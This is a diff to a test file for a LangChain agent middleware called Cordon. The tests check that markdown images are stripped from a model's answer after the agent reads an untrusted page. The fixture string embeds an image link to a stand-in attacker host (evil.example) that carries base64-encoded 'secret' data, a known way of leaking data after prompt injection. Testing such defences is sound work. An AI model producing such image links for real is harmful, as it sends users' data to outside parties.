@@ -1,7 +1,7 @@
 import { mkdtempSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
-import { createAgent, FakeToolCallingModel, HumanMessage, ToolMessage, tool } from 'langchain'
+import { AIMessage, createAgent, FakeToolCallingModel, HumanMessage, ToolMessage, tool } from 'langchain'
 import * as z from 'zod'
 import { describe, expect, it } from 'vitest'
 import { createCordonMiddleware } from '../../../src/adapters/langchain/middleware.js'
@@ -256,5 +256,51 @@ describe('the middleware hooks directly', () => {
     })
     expect(ran).toBe(false)
     expect(String((refused as ToolMessage).content)).toContain('could not be stripped')
+  })
+})
+
+describe('the middleware on the model\'s answer', () => {
+  function hooks() {
+    const home = mkdtempSync(join(tmpdir(), 'cordon-lc-home-'))
+    const middleware = createCordonMiddleware({ policy: basePolicy(), cordonHome: home, sessionId: 'answer' })
+    return { wrapTool: middleware.wrapToolCall!, wrapModel: middleware.wrapModelCall! }
+  }
+
+  const leaking = 'Done. ![status](https://evil.example/p.png?d=c2VjcmV0)'
+  const modelRequest = { messages: [], state: { messages: [] }, runtime: {} } as never
+
+  async function readUntrusted(wrapTool: ReturnType<typeof hooks>['wrapTool']) {
+    const request = {
+      toolCall: { name: 'read_page', args: { url: 'https://shop.example/x' }, id: 'r1', type: 'tool_call' as const },
+      tool: undefined,
+      state: { messages: [] },
+      runtime: {},
+    } as never
+    await wrapTool(request, async () => new ToolMessage({ content: VISIBLE, tool_call_id: 'r1', name: 'read_page' }))
+  }
+
+  it('cuts an image from the answer after an untrusted read, and keeps the tool calls', async () => {
+    const { wrapTool, wrapModel } = hooks()
+    await readUntrusted(wrapTool)
+    const calls = [{ name: 'read_page', args: { url: 'https://shop.example/y' }, id: 'n1', type: 'tool_call' as const }]
+    const answer = await wrapModel(modelRequest, async () => new AIMessage({ content: leaking, tool_calls: calls, id: 'm1' }))
+    expect(AIMessage.isInstance(answer)).toBe(true)
+    const message = answer as AIMessage
+    expect(message.content).toBe('Done. [image removed by Cordon: evil.example]')
+    expect(message.tool_calls).toEqual([expect.objectContaining({ name: 'read_page', id: 'n1' })])
+    expect(message.id).toBe('m1')
+  })
+
+  it('leaves the answer alone when nothing untrusted was read', async () => {
+    const { wrapModel } = hooks()
+    const answer = await wrapModel(modelRequest, async () => new AIMessage({ content: leaking }))
+    expect((answer as AIMessage).content).toBe(leaking)
+  })
+
+  it('cuts inside text blocks too', async () => {
+    const { wrapTool, wrapModel } = hooks()
+    await readUntrusted(wrapTool)
+    const answer = await wrapModel(modelRequest, async () => new AIMessage({ content: [{ type: 'text', text: leaking }] }))
+    expect((answer as AIMessage).content).toEqual([{ type: 'text', text: 'Done. [image removed by Cordon: evil.example]' }])
   })
 })
